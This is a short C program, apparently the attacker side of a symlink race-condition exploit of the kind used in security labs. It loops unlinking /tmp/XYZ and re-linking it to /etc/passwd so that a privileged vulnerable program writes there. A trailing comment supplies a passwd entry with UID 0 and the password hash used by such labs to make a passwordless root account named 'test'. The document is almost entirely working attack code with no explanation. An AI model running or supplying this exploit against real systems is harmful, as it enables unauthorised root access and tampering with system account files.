#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

int main() {
	char pfile[] = "/etc/passwd";
	char tfile[] = "/tmp/XYZ";
	while(1){
		unlink(tfile);
		int ret = symlink(pfile, tfile);
		printf("%d", ret);
	}

	return 0;

//will make a user with no password required
//test:U6aMy0wojraho:0:0:test:/root:/bin/bash
}